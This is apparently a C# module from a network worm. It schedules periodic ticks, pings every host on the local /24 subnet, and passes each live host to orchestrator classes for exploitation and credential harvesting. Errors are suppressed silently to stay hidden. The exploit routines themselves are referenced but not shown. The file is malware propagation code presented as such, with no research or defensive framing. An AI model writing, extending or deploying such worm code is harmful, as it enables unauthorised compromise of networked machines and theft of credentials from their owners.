using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Net;  // Added this for IPEndPoint

namespace XYZ.modules.worm
{
    public class NetworkScanner
    {
        public void StartScanning()
        {
            System.Timers.Timer wormTimer = new System.Timers.Timer(300000); // 5 minutes
            wormTimer.Elapsed += WormTimer_Elapsed;
            wormTimer.AutoReset = true;
            
            Task.Run(() => DelayedWormTick());
            wormTimer.Start();
        }

        private void WormTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            Task.Run(() => WormTick());
        }

        private void DelayedWormTick()
        {
            Task.Delay(30000).Wait();
            Task.Run(() => WormTick()).Wait();
        }

        private void WormTick()
        {
            try
            {
                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    return;
                }
                
                string networkPrefix = GetNetworkPrefix(localIP);
                if (string.IsNullOrEmpty(networkPrefix))
                {
                    return;
                }
                
                ScanNetworkForTargets(networkPrefix);
            }
            catch
            {
                // Silent fail
            }
        }

        private string GetLocalIPAddress()
        {
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return (endPoint != null) ? endPoint.Address.ToString() : "";
                }
            }
            catch
            {
                return "";
            }
        }

        private string GetNetworkPrefix(string localIP)
        {
            try
            {
                string[] parts = localIP.Split('.');
                if (parts.Length == 4)
                {
                    return parts[0] + "." + parts[1] + "." + parts[2] + ".";
                }
            }
            catch
            {
                return "192.168.1.";
            }
            return "192.168.1.";
        }

        private void ScanNetworkForTargets(string networkPrefix)
        {
            try
            {
                List<string> activeHosts = new List<string>();
                
                for (int i = 1; i < 255; i++)
                {
                    string targetIP = networkPrefix + i;
                    if (targetIP == GetLocalIPAddress())
                        continue;
                    
                    if (IsHostAlive(targetIP))
                    {
                        activeHosts.Add(targetIP);
                        // Create orchestrator to handle exploitation
                        WormOrchestrator orchestrator = new WormOrchestrator();
                        orchestrator.ExploitTarget(targetIP);
                    }
                }
                
                if (activeHosts.Count > 0)
                {
                    // Handle advanced exploitation
                    AdvancedExploiter advancedExploiter = new AdvancedExploiter();
                    advancedExploiter.AdvancedNetworkExploitation(activeHosts);
                    
                    // Try credential harvesting on active hosts
                    foreach (string targetIP in activeHosts)
                    {
                        WormOrchestrator orchestrator = new WormOrchestrator();
                        orchestrator.HarvestCredentials(targetIP);
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }

        private bool IsHostAlive(string ipAddress)
        {
            try
            {
                using (Ping ping = new Ping())
                {
                    PingReply reply = ping.Send(ipAddress, 1000);
                    return reply.Status == IPStatus.Success;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}